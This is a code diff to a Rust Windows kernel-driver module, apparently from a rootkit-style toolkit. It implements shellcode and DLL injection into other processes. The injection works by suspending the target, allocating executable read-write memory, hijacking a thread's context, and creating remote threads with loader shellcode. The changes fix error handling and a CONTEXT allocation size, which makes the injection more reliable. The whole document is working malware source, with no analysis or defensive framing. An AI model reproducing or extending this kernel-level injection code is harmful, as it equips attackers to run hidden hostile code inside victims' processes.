@@ -23,10 +23,7 @@ use crate::{
     handle::Handle, 
     pool::PoolMemory
 };
-use crate::{
-    address::get_module_base_address,
-    data::KAPC_ENVIROMENT::OriginalApcEnvironment, 
-};
+use crate::data::KAPC_ENVIROMENT::OriginalApcEnvironment;
 
 /// Represents shellcode injection operations.
 pub struct Shellcode;
@@ -255,11 +252,11 @@ impl Shellcode {
         let thread = find_thread(pid)?;
         let buffer = read_file(path)?;
 
-        // Locate the base address of the kernel module
-        let ntoskrnl = get_module_base_address("ntoskrnl.exe")?;
-
         // Suspend the target process to ensure a stable environment
-        PsSuspendProcess(process.e_process);
+        let mut status = PsSuspendProcess(process.e_process);
+        if !NT_SUCCESS(status) {
+            return Err(ShadowError::ApiCallFailed("PsSuspendProcess", status));
+        }
 
         // Attach to the target process for memory manipulation
         let mut attach = ProcessAttach::new(process.e_process);
@@ -267,7 +264,7 @@ impl Shellcode {
         // Allocate memory in the target process for the payload
         let mut base_address = null_mut();
         let mut region_size = buffer.len() as u64;
-        let mut status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -277,7 +274,8 @@ impl Shellcode {
 
         // Allocate memory for the CONTEXT structure in the target process
         let mut context_addr = null_mut();
-        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut context_addr, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,);
+        let mut context_size = size_of::<CONTEXT>() as u64;
+        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut context_addr, 0, &mut context_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory [2]", status));
         }
@@ -307,7 +305,7 @@ impl Shellcode {
         attach.detach();
 
         // Resume the process, allowing it to execute the modified context
-        let status = PsResumeProcess(process.e_process);
+        status = PsResumeProcess(process.e_process);
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("PsResumeProcess", status));
         }
@@ -370,20 +368,6 @@ impl DLL {
             KernelMode as i8,
             &mut return_size,
         );
-
-        // Change the memory protection to executabl
-        let mut old_protect = 0;
-        status = ZwProtectVirtualMemory(
-            h_process.get(),
-            &mut base_address,
-            &mut region_size,
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        );
-        
-        if !NT_SUCCESS(status) {
-            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
-        }
 
         // Create a thread in the target process to load the DLL
         let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
@@ -464,7 +448,7 @@ impl DLL {
             &mut return_size,
         );
 
-        // Allocate memory in the target process for the DLL path
+        // Allocate memory for shellcode
         let mut shellcode_address = null_mut();
         let mut shellcode_size = LDR_SHELLCODE.len() as u64;
         status = ZwAllocateVirtualMemory(h_process.get(), &mut shellcode_address, 0, &mut shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
